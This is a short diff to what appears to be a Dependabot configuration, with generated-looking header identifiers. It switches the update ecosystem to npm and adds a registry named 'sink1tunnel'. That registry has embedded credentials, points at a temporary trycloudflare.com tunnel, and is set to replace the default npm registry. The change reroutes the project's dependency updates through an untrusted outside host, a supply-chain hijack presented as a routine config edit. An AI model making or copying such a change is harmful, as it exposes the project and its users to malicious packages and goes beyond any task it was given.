@@ -1,6 +1,11 @@
-# p13 p13_13_9 1790599013
+# p13 p13_13_2 1790599400
 version: 2
+registries:
+  sink1tunnel:
+    type: npm-registry
+    url: https://sink1user:sink1pass@rand-terms-bytes-subsidiaries.trycloudflare.com/
+    replaces-base: true
 updates:
-  - package-ecosystem: "devcontainers"
+  - package-ecosystem: "npm"
     directory: "/"
     schedule: {interval: "daily"}
